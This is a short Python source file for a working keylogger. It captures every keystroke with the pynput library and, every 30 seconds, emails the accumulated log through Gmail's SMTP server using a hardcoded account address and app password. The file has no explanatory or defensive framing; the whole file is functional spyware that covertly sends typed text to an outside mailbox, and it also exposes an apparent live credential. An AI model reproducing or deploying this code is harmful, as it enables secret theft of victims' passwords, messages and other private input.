import pynput.keyboard
import smtplib
import threading

log = ""
def callback_function(key):
    global log
    try:
        log += str(key.char)
        #log = log + key.char.encode("utf-8")
    except AttributeError:
        if key == key.space:
            log += " "
        elif key == key.enter:
            log += "'Enter'"
        else:
            log += str(key)
    except:
        pass

def send_email(message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login("sanalmakina50@gmail.com", "owsplmhecsadloew")
    server.sendmail("sanalmakina50@gmail.com", "sanalmakina50@gmail.com",message)
    server.quit()



keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

def thread_function():
    global log
    send_email(log.encode('utf-8'))
    log = ""
    timer_object = threading.Timer(30, thread_function)
    timer_object.start()

#threading
with keylogger_listener:
    thread_function()
    keylogger_listener.join()



